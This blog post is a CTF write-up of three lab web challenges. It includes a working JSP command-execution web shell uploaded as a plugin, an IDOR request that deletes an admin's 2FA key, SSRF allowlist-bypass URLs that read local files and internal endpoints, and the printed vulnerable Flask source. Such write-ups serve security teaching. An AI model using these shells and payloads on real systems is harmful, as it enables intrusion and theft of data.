---
layout: post
title:  "Web Challenges"
date:   2026-10-12 12:51:00 -0400
author: uzi
tags: [CTF]
permalink: /kubstu-ctf-2026-web/
---
* TOC
{:toc}

## PulseRelay

**Category**: web

**Description**: PulseRelay is an enterprise real-time messaging infrastructure platform by Relay Systems Corp. The admin console provides server configuration, user management, plugin extensions, and monitoring dashboards. The platform powers internal communications for several organizations.

Your goal is to gain unauthorized access to the administration console and retrieve the flag from the server.

The application runs an embedded Jetty server with custom path-based access control. Explore the application's routing, authentication mechanisms, and plugin management features to find a way in.

Credentials: user / password123

Going to the challenge site:

![Alt text](/images/kubweb3.png)

Login with `user:password123`:

![Alt text](/images/kubweb4.png)

Now I was on `/admin/dashboard`. 

On `/admin/users` I found I could create an admin user:

![Alt text](/images/kubweb5.png)

This didnt actually seem to give me more permissions as far as I could tell. Regardless I logged into my admin account:

![Alt text](/images/kubweb6.png)

I then tested the upload plugin feature:

![Alt text](/images/kubweb7.png)

I created my test `.jar` file:
```shell
mkdir -p testjar/META-INF  
echo "Manifest-Version: 1.0" > testjar/META-INF/MANIFEST.MF  
echo "hello from plugin" > testjar/index.html  
cd testjar  
jar cf ../test.jar .
```

When I uploaded the plugin I eventually discovered I was able to visit `index.html` at:
```shell
curl https://6d6b93f5-494a-41af-ace2-890a1efb908b.labs.hackadvisor.io/plugins/test/index.html  
hello from plugin
```
The path was based on the name I gave the plugin. Like `/plugins/<name>/<file you uploaded>`.

From here I wanted to test if JSP execution was enabled. 

I created a new jar file containing `shell.jsp`:
```shell
mkdir -p shelljar/META-INF  
echo "Manifest-Version: 1.0" > shelljar/META-INF/MANIFEST.MF  

nano shelljar/shell.jsp  

ls shelljar/  
META-INF  shell.jsp  

cat shelljar/shell.jsp  
<%@ page import="java.util.*,java.io.*" %>  
<%  
String cmd = request.getParameter("cmd");  
if(cmd != null){  
	Process p = Runtime.getRuntime().exec(cmd);  
	BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));  
	String line;  
	while((line = br.readLine()) != null) out.println(line);  
}  
%>  

cd shelljar 
 
jar cf ../shell.jar .
```

I uploaded this plugin and test the shell:
```shell
curl "https://6d6b93f5-494a-41af-ace2-890a1efb908b.labs.hackadvisor.io/plugins/shell/shell.jsp?cmd=id"  
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```
Nice!

Find the flag:
```shell
curl "https://6d6b93f5-494a-41af-ace2-890a1efb908b.labs.hackadvisor.io/plugins/shell/shell.jsp?cmd=cat%20start.sh"  
#!/bin/sh  
set -e  
  
mkdir -p /app/data  
mkdir -p /tmp/jetty-work  
mkdir -p /tmp/plugins  
mkdir -p /tmp/plugins-extracted  
  
echo "$FLAG" > /root/flag.txt  
chmod 600 /root/flag.txt  
  
exec java -Djava.io.tmpdir=/tmp \  
  -Djetty.work=/tmp/jetty-work \  
  -jar /app/pulserelay.jar  

curl "https://6d6b93f5-494a-41af-ace2-890a1efb908b.labs.hackadvisor.io/plugins/shell/shell.jsp?cmd=cat%20/root/flag.txt"  
KubSTU{pul53r3l4y_pl4t_rc3_62a90facf9f5d33e}
```

`KubSTU{pul53r3l4y_pl4t_rc3_62a90facf9f5d33e}`

___

## KeyVault Pro

**Category**: web

**Description**: KeyVault Pro is an enterprise credential management platform built by SecureNest Solutions. The application allows teams to securely store API keys, database credentials, and other secrets in organized vaults. It features role-based access control, WebAuthn-based two-factor authentication, team management, and comprehensive audit logging.

The platform recently rolled out WebAuthn security key support as part of a company-wide initiative to strengthen account security. All team members are encouraged to register hardware security keys for two-factor authentication, and several key personnel — including the platform administrator — have already enrolled their devices.

Your objective is to find and exploit a vulnerability in the application that allows you to access sensitive information that should be restricted to the admin user. Look carefully at how the platform manages security devices and user profiles.

Credentials: Register a new account at /register, or use an existing team member account to explore the application.

I went the challenge site and created an account and logged in:

![Alt text](/images/kubweb8.png)

On `/team` I was able to click around on different profiles (from `/api/team/1 to /api/team/8`):

![Alt text](/images/kubweb9.png)

It made api requests like this:
```http
GET /api/team/1 HTTP/1.1
Host: db6172de-8fc9-4fa5-9c74-2716425b5493.labs.hackadvisor.io
Cookie: connect.sid=s%3Aq8YOhtg1iwvTN7k1Ga5zQRzYedU3-4vF.OGjkGMYDFzhkc3lcUuMnZ3AzrLm084n4FgQy3XBd18U
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://db6172de-8fc9-4fa5-9c74-2716425b5493.labs.hackadvisor.io/team
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive
```

Response:
```http
HTTP/1.1 200 OK
Server: nginx/1.25.5
Date: Sat, 10 Oct 2026 08:38:15 GMT
Content-Type: application/json; charset=utf-8
Connection: keep-alive
Vary: Accept-Encoding
X-Powered-By: Express
ETag: W/"3ef-9MHRLEsMsfsVbCKneMW2/acGUaU"
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
Content-Length: 1007

{
  "id": 1,
  "username": "admin",
  "display_name": "Marcus Webb",
  "email": "admin@securenest.io",
  "role": "admin",
  "avatar_color": "#4f46e5",
  "created_at": "2024-01-15 09:00:00",
  "security": {
    "two_factor_enabled": true,
    "device": {
      "id": 1,
      "credential_id": "aGk1X3NlY3VyaXR5X2tleV9hZG1pbl9tYXJjdXM",
      "device_name": "YubiKey 5 NFC",
      "registered_at": "2024-01-20 10:00:00"
    }
  },
  "stats": {
    "vault_count": 3
  },
  "recent_activity": [
    {
      "action": "credential_rotated",
      "details": "Rotated AWS access keys in \"AWS Production\"",
      "created_at": "2024-11-28 09:15:00"
    },
    {
      "action": "policy_updated",
      "details": "Updated password policy: minimum 12 characters required",
      "created_at": "2024-11-01 10:00:00"
    },
    {
      "action": "user_invited",
      "details": "Invited new team member a.nakamura@securenest.io",
      "created_at": "2024-04-30 09:00:00"
    },
    {
      "action": "credential_added",
      "details": "Added 3 credentials to \"AWS Production\"",
      "created_at": "2024-01-25 10:05:00"
    },
    {
      "action": "device_registered",
      "details": "Registered security key \"YubiKey 5 NFC\"",
      "created_at": "2024-01-20 10:30:00"
    }
  ]
}
```

After letting my proxy connected for a while I saw a GET request to `/api/announcements`. Response:
```http
HTTP/1.1 200 OK
Server: nginx/1.25.5
Date: Sat, 10 Oct 2026 08:37:26 GMT
Content-Type: application/json; charset=utf-8
Connection: keep-alive
Vary: Accept-Encoding
X-Powered-By: Express
ETag: W/"7ef-TSEjY6Ve4iHRUhedRAqCLZOC7a4"
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
Content-Length: 2031

[
  {
    "id": 3,
    "title": "System Maintenance — December 2024",
    "content": "Scheduled maintenance window: December 7, 2024, 2:00 AM - 4:00 AM UTC. During this time, credential access may be temporarily unavailable. Please plan accordingly. Default service accounts will be reset — reminder that the platform admin recovery credentials follow our standard convention: admin / admin2024!",
    "author_id": 1,
    "created_at": "2024-11-29 10:00:00",
    "author_name": "Marcus Webb"
  },
  {
    "id": 5,
    "title": "Q3 Security Audit Complete",
    "content": "Our quarterly security audit has been completed successfully. Key findings:\n- All production credentials rotated on schedule\n- Zero unauthorized access attempts detected\n- WebAuthn adoption rate: 37.5% (3/8 team members)\n\nGreat work, team! Let's push for 100% 2FA adoption by end of Q4.",
    "author_id": 7,
    "created_at": "2024-10-01 09:30:00",
    "author_name": "Ryan Johnson"
  },
  {
    "id": 4,
    "title": "New Team Member: Aiko Nakamura",
    "content": "Please join us in welcoming Aiko Nakamura to the team! Aiko will be joining us as a QA Engineer, focusing on automated testing and quality assurance for our credential management workflows. Welcome aboard, Aiko!",
    "author_id": 5,
    "created_at": "2024-05-01 14:00:00",
    "author_name": "Tyler Wright"
  },
  {
    "id": 2,
    "title": "Mandatory Security Key Registration",
    "content": "As part of our 2024 security initiative, all team members are required to register a WebAuthn security key by February 28, 2024. You can register your device under Settings > Security. If you need a hardware key, please contact IT.",
    "author_id": 1,
    "created_at": "2024-02-01 08:00:00",
    "author_name": "Marcus Webb"
  },
  {
    "id": 1,
    "title": "Welcome to KeyVault Pro v2.4",
    "content": "We are excited to announce the release of KeyVault Pro v2.4! This update includes WebAuthn-based two-factor authentication, improved vault sharing controls, and enhanced audit logging. Please update your security settings and register a security key at your earliest convenience.",
    "author_id": 1,
    "created_at": "2024-01-15 09:00:00",
    "author_name": "Marcus Webb"
  }
]
```

I get login credentials for admin: `admin:admin2024!`

But the admin account is still protected by the credential id `aGk1X3NlY3VyaXR5X2tleV9hZG1pbl9tYXJjdXM`. Logging in takes me to a two factor authentication screen:

![Alt text](/images/kubweb10.png)

I was able to delete the key by sending this request:
```http
DELETE /api/security/devices/aGk1X3NlY3VyaXR5X2tleV9hZG1pbl9tYXJjdXM HTTP/1.1
Host: 25a2a1eb-bd70-4515-b76e-5a9854ecd908.labs.hackadvisor.io
Cookie: connect.sid=s%3AQQdPDsF43eI_3tE7YtWrMXlDuLzN2gTa.i%2BctF2Q4%2BMo9crpiQhAWNYEVPwz5ZfYKA3guz6cXBzM
Content-Type: application/json
```
I found this by creating a key for my own account. It made a POST request to `/api/security/devices/register`.

Response:
```http
HTTP/1.1 200 OK
Server: nginx/1.25.5
Date: Sat, 10 Oct 2026 09:43:36 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 63
Connection: keep-alive
Vary: Accept-Encoding
X-Powered-By: Express
ETag: W/"3f-DKsBNYM9fV0ciCssLaclXfmiWGo"
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin

{"success":true,"message":"Security key removed successfully."}
```

This successfully disables 2fa for the admin account:

![Alt text](/images/kubweb11.png)

The flag was on `/admin/notes`!

`KubSTU{k3yv4ult_1d0r_2f4_ee3136942fe18485}`

___

## Kuban Relay

**Category**: web

**Description**: KubMail, a regional service for sharing documents, routes, and useful information with residents of Kuban, has been launched in Krasnodar. On the website, you can find tram schedules, a recipe for authentic adjika, and other materials from the public archive. Following a recent update, the developers also added a link preview feature to integrate with the region’s weather service. Rumor has it that the old archive gateway is still operating somewhere on the internal network. You need to get access to the file - krd_weather_backup.txt

Going to the challenge site:

![Alt text](/images/kubweb12.png)

I found these endpoints on the page:
```shell
/download?name=
/status
/api/route?from=&to=
/api/preview?url=
/api/docs
```

Looking at `/status` and `/api/docs`:
```shell
curl http://159.194.241.219:5000/status | jq   
{  
  "archive_adapter": "private-network gateway",  
  "preview": "/api/preview",  
  "region": "Krasnodar Krai",  
  "service": "KubMail",  
  "version": "2.3.1-legacy"  
}

curl http://159.194.241.219:5000/api/docs | jq    
{  
  "endpoints": {  
	"preview": "/api/preview?url=<URL>",  
	"route": "/api/route?from=&to="  
  },  
  "name": "KubMail integration API",  
  "preview_note": "Preview accepts approved kubmail.local integration URLs.",  
  "version": "2.3"  
}
```

Looking at `/download`:
```shell
curl "http://159.194.241.219:5000/download?name=welcome.txt"  
Добро пожаловать в KubMail!  
  
Ваш цифровой архив Кубани уже рядом.
```

`/download` rejected basic path traversal tricks:
```shell
curl "http://159.194.241.219:5000/download?name=../../../../etc/passwd"  
<!doctype html>  
<html lang=en>  
<title>403 Forbidden</title>  
<h1>Forbidden</h1>  
<p>You don&#39;t have the permission to access the requested resource. It is either read-protected or not readable by the server.</p>
```

On `/api/docs` they mention this:
```shell
Preview accepts approved kubmail.local integration URLs.
```

I made this request but it got rejected:
```shell
curl -s "http://159.194.241.219:5000/api/preview?url=file:///etc/passwd#kubmail.local"  
{"error":"destination is not on the approved integration network"}
```

After a while I realized this didnt work because I needed to url encode the `#`:
```shell
curl -s "http://159.194.241.219:5000/api/preview?url=file:///etc/passwd%23kubmail.local"  
{"body":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nappuser:x:10001:10001::/home/appuser:/bin/sh\n","content_type":"text/plain","status":null}
```
It seems the request path is validated when `kubmail.local` exists.

I then downloaded the source code from `/app/app.py`:
```shell
curl -s "http://159.194.241.219:5000/api/preview?url=file:///app/app.py%23kubmail.local"
```

Source code:
```python
from flask import Flask, request, jsonify, render_template_string, abort, send_file
from pathlib import Path
from urllib.parse import unquote
from urllib.request import Request, urlopen
import json

BASE_DIR = Path(__file__).resolve().parent
PUBLIC_DIR = BASE_DIR / "data" / "public"
PRIVATE_DIR = BASE_DIR / "data" / "private"

app = Flask(__name__)

INDEX = r'''<!doctype html><html lang="ru"><head><meta charset="utf-8"><title>KubMail — региональный архив</title><style>
body{margin:0;background:#f5efe3;color:#28251f;font:16px/1.5 Georgia,serif}.wrap{max-width:1000px;margin:auto;padding:28px}.top{display:flex;justify-content:space-between;border-bottom:3px solid #21613b;padding-bottom:14px}.logo{font-size:31px;font-weight:bold;color:#21613b}.badge{background:#f0be28;padding:5px 12px;border-radius:15px;font:13px Arial}.grid{display:grid;grid-template-columns:2fr 1fr;gap:22px;margin-top:24px}.card{background:#fffaf0;border:1px solid #d9ccb2;border-radius:12px;padding:20px;box-shadow:0 4px 0 #e5d7bd}.hero{background:#21613b;color:#fffaf0;border-radius:12px;padding:25px}.hero h1{margin:0 0 8px;font-size:29px}.card h2{color:#21613b}.links a{display:block;color:#21613b;text-decoration:none;padding:8px 0;border-bottom:1px dashed #c9b994}.links a:hover{text-decoration:underline}.small{font:13px Arial;color:#6c665b}.note{background:#fff2bf;padding:12px;border-left:4px solid #d49600;font:14px Arial}.mono{font:13px monospace;background:#eee6d5;padding:2px 5px}
</style></head><body><div class="wrap"><div class="top"><div class="logo">✉ KubMail</div><div class="badge">Краснодарский край • beta</div></div><div class="grid"><main><div class="hero"><h1>Почта, которая пахнет чернозёмом</h1><p>Региональный сервис справок, маршрутов и цифровых архивов Кубани.</p></div><div class="card"><h2>Публичные материалы</h2><div class="links"><a href="/download?name=welcome.txt">Приветственное письмо</a><a href="/download?name=tram_krd.txt">Трамвайная памятка Краснодара</a><a href="/download?name=recipe.txt">Рецепт настоящей кубанской аджики</a></div></div><div class="card"><h2>Проверка ссылки для предпросмотра</h2><p class="small">Функция временно скрыта из меню после обновления архивного шлюза.</p><p class="note">Подсказка для интеграторов: endpoint предпросмотра сохранён в API-документации.</p></div></main><aside><div class="card"><h2>Кубанский статус</h2><p>Краснодар: ясно, +27°C. Трамвай №7 следует по расписанию.</p><div class="links"><a href="/status">Статус системы</a><a href="/api/route?from=Вишняки&to=Аврора">Маршрутный помощник</a><a href="/api/docs">API-документация</a></div></div><div class="card"><h2>О проекте</h2><p class="small">KubMail использует старый архивный шлюз для совместимости с метеослужбой края.</p></div></aside></div></div></body></html>'''

@app.get('/')
def index():
    return render_template_string(INDEX)

@app.get('/api/docs')
def docs():
    return jsonify({
        'name': 'KubMail integration API',
        'version': '2.3',
        'endpoints': {
            'preview': '/api/preview?url=<URL>',
            'route': '/api/route?from=&to='
        },
        'preview_note': 'Preview accepts approved kubmail.local integration URLs.'
    })

@app.get('/api/preview')
def preview():
    target = request.args.get('url', '')

    # Bug: allowlist is a substring check on the complete URL, not the effective host.
    if 'kubmail.local' not in target:
        return jsonify({'error': 'destination is not on the approved integration network'}), 403

    try:
        # The proxy forwards requests to the URL supplied by the caller.
        # A real deployment would resolve kubmail.local through private DNS.
        req = Request(
            target,
            headers={
                'X-Kubmail-Proxy': 'preview-v2',
                'X-Forwarded-For': '10.23.7.14'
            }
        )

        with urlopen(req, timeout=2) as response:
            body = response.read(8192).decode('utf-8', errors='replace')
            return jsonify({
                'status': response.status,
                'content_type': response.headers.get('Content-Type', ''),
                'body': body
            })

    except Exception as exc:
        return jsonify({
            'error': 'upstream unavailable',
            'detail': str(exc)[:160]
        }), 502

@app.get('/api/route')
def route():
    return jsonify({
        'from': request.args.get('from'),
        'to': request.args.get('to'),
        'line': '7',
        'advice': 'Не забудьте компостер: он любит порядок.'
    })

@app.get('/status')
def status():
    return jsonify({
        'service': 'KubMail',
        'region': 'Krasnodar Krai',
        'version': '2.3.1-legacy',
        'archive_adapter': 'private-network gateway',
        'preview': '/api/preview'
    })

@app.get('/download')
def download():
    name = request.args.get('name', '')

    if not name or name.startswith('/') or '\\' in name or '..' in name:
        abort(403)

    target = PUBLIC_DIR / name

    if not target.is_file():
        abort(404)

    return send_file(target, as_attachment=True, download_name=target.name)

@app.get('/internal/health')
def internal_health():
    if request.headers.get('X-Kubmail-Proxy') != 'preview-v2':
        abort(404)

    return jsonify({
        'service': 'krd-archive-gateway',
        'status': 'ok',
        'build': '2024.03.17',
        'routes': '/internal/debug/routes',
        'note': 'legacy export requires a gateway ticket'
    })

@app.get('/internal/debug/routes')
def internal_debug():
    if request.headers.get('X-Kubmail-Proxy') != 'preview-v2':
        abort(404)

    return jsonify({
        'routes': [
            '/internal/health',
            '/internal/debug/routes',
            '/internal/archive/export'
        ],
        'export': {
            'method': 'GET',
            'ticket': 'tram-7-archive',
            'parameter': 'name'
        },
        'warning': 'debug route accidentally enabled in beta'
    })

@app.get('/internal/archive/export')
def internal_export():
    if request.headers.get('X-Kubmail-Proxy') != 'preview-v2':
        abort(404)

    if request.args.get('ticket') != 'tram-7-archive':
        return jsonify({'error': 'invalid gateway ticket'}), 401

    raw = request.args.get('name', '')

    # Second legacy decoding layer: the gateway decodes after the proxy/WSGI layer.
    name = unquote(raw)
    target = (PUBLIC_DIR / name).resolve()

    if not target.is_file():
        abort(404)

    return send_file(target, as_attachment=True, download_name=target.name)

@app.get('/about')
def about():
    return 'KubMail — учебный сервис регионального цифрового архива.'

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=False)
```

The internal export route needs the `X-Kubmail-Proxy: preview-v2` header (only the app itself sends this never me directly) and a valid `ticket`. 

`/internal/archive/export` never validates `name`. 

I can request `/internal/debug/routes` like this:
```shell
curl -s "http://159.194.241.219:5000/api/preview?url=http://172.18.0.2:5000/internal/debug/routes?kubmail.local"  
{"body":"{\"export\":{\"method\":\"GET\",\"parameter\":\"name\",\"ticket\":\"tram-7-archive\"},\"routes\":[\"/internal/health\",\"/internal/debug/routes\",\"/internal/archive/export\"],\"warning\":\"debug route accidentally enabled in beta\"}\n","content_type":"application/json","status":200}
```

I sent this request to get the flag:
```shell
curl -sS 'http://159.194.241.219:5000/api/preview?url=http%3A%2F%2F172.18.0.2%3A5000%2Finternal%2Farchive%2Fexport%3Fticket%3Dtram-7-archive%26name%3D..%2Fprivate%2Fkrd_weather_backup.txt%26kubmail.local%3D1'
{"body":"Архив метеослужбы Краснодара — внутренний файл\n\nKubSTU{kuban_legacy_gateway_reads_between_the_lines}\n","content_type":"text/plain; charset=utf-8","status":200}
```

To make it easier to read, it decodes to this:
```shell
http://159.194.241.219:5000/api/preview?url=http://172.18.0.2:5000/internal/archive/export?ticket=tram-7-archive&name=../private/krd_weather_backup.txt&kubmail.local=1
```

I found `172.18.0.2:5000` from looking around earlier. I was able to make this request and get the home page:
```shell
curl -s "http://159.194.241.219:5000/api/preview?url=http://172.18.0.2:5000/?kubmail.local"
```
The `172.18.0.0/16` range is what docker assigns to the first user defined bridge network. 

`kubmail.local=1` satisfies `/api/preview`s substring allowlist check and lets the request through!

`KubSTU{kuban_legacy_gateway_reads_between_the_lines}`
